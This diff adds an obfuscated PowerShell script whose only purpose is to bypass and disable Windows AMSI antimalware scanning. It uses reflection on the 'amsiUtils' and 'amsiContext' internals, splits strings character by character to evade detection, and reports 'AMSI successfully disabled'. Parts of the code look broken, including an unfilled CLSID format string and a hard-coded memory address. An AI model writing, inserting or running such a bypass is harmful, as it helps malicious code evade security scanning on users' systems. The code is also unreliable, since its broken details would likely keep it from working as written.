@@ -1,0 +1,14 @@
+$a = [System.AppDomain]::CurrentDomain.GetAssemblies()
+$a | % {
+    $_.GetTypes() | % {
+        if($_.Name -eq "$($OFS='')a"+"m"+"s"+"i"+"U"+"t"+"i"+"ls") {
+            $f = $_.GetField("$($OFS='')a"+"m"+"s"+"iC"+"o"+"nt"+"ext", [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static)
+            $b = $f.GetValue($null)
+            $c = [System.Runtime.InteropServices.Marshal]::GetComInterfaceForObject($b, [Type]::GetTypeFromCLSID("$($OFS=''){2}{0}{1}{4}{3}{6}{5}{7}{8}{9}{10}"))
+            $d = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer([IntPtr]0x7ffce6f8e9f0, [Type]"System.Func`2[System.IntPtr,System.IntPtr]")
+            $d.Invoke($c)
+            return "$($OFS='')F"+"u"+"n"+"c"+"t"+"i"+"o"+"n $($OFS='')B"+"y"+"p"+"a"+"s"+"s-$($OFS='')A"+"m"+"s"+"i{$($OFS='')'$($OFS='')A"+"M"+"S"+"I $($OFS='')s"+"u"+"c"+"c"+"e"+"s"+"s"+"f"+"u"+"l"+"l"+"y $($OFS='')d"+"i"+"s"+"a"+"b"+"l"+"e"+"d."+"'}"
+        }
+    }
+}
+return "$($OFS='')F"+"a"+"i"+"l"+"e"+"d $($OFS='')t"+"o $($OFS='')b"+"y"+"p"+"a"+"s"+"s $($OFS='')A"+"M"+"S"+"I."
